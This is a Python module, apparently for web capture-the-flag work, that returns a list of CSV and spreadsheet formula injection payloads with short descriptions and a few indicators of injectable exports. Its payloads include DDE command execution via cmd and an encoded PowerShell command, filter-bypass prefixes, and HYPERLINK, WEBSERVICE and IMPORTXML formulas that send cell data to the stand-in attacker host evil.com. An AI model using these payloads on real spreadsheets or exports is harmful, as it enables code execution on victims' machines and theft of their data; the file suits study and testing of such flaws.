"""
CSV / Formula Injection Payload Crafter for Web CTF.
Covers formula injection (=, +, -, @), CSV injection via exported data,
and spreadsheet formula exploitation.
"""

from typing import List, Dict


def get_csv_injection_payloads() -> List[Dict[str, str]]:
    """Generate CSV / formula injection payloads."""
    return [
        {
            "name": "Formula Injection (=)",
            "payload": "=cmd|' /C calc'!A0",
            "desc": "Excel formula injection that executes commands when opened."
        },
        {
            "name": "Formula Injection (+)",
            "payload": "+cmd|' /C calc'!A0",
            "desc": "Plus-prefixed formula injection."
        },
        {
            "name": "Formula Injection (-)",
            "payload": "-cmd|' /C calc'!A0",
            "desc": "Minus-prefixed formula injection."
        },
        {
            "name": "Formula Injection (@)",
            "payload": "@SUM(1+1)",
            "desc": "At-prefixed formula injection."
        },
        {
            "name": "DDE Command Execution",
            "payload": "=cmd|' /C powershell -e JABjAGwAaQBlAG4AdAA9AE4AZQB3AC0ATwBiAGoAZQBjAHQAKAApAA=='!A0",
            "desc": "DDE (Dynamic Data Exchange) command execution."
        },
        {
            "name": "External Link Exfiltration",
            "payload": "=HYPERLINK(\"http://evil.com/?data=\"&A1,\"click\")",
            "desc": "Hyperlink formula that exfiltrates cell data to attacker server."
        },
        {
            "name": "Web Request Exfiltration",
            "payload": "=WEBSERVICE(\"http://evil.com/?data=\"&A1)",
            "desc": "WEBSERVICE formula that sends cell data to attacker server."
        },
        {
            "name": "ImportXML Exfiltration",
            "payload": "=IMPORTXML(\"http://evil.com/?data=\"&A1,\"//x\")",
            "desc": "Google Sheets IMPORTXML formula for data exfiltration."
        },
        {
            "name": "Formula with Quotes",
            "payload": "=\"\"\"=cmd|' /C calc'!A0\"\"\"",
            "desc": "Quoted formula to bypass simple filters."
        },
        {
            "name": "Tab-Prefixed Formula",
            "payload": "\t=cmd|' /C calc'!A0",
            "desc": "Tab-prefixed formula to bypass leading character filters."
        },
        {
            "name": "Space-Prefixed Formula",
            "payload": " =cmd|' /C calc'!A0",
            "desc": "Space-prefixed formula to bypass leading character filters."
        },
        {
            "name": "Single Quote Prefix",
            "payload": "'=cmd|' /C calc'!A0",
            "desc": "Single-quote prefix to bypass formula detection."
        }
    ]


def get_csv_injection_indicators() -> List[Dict[str, str]]:
    """Indicators that CSV injection is possible."""
    return [
        {
            "indicator": "User input in CSV export",
            "desc": "If user-controlled data is exported to CSV without sanitization."
        },
        {
            "indicator": "Data starts with = + - @",
            "desc": "If exported data starts with formula characters, injection is possible."
        },
        {
            "indicator": "No escaping of special chars",
            "desc": "If CSV export doesn't escape =, +, -, @, or quotes."
        }
    ]
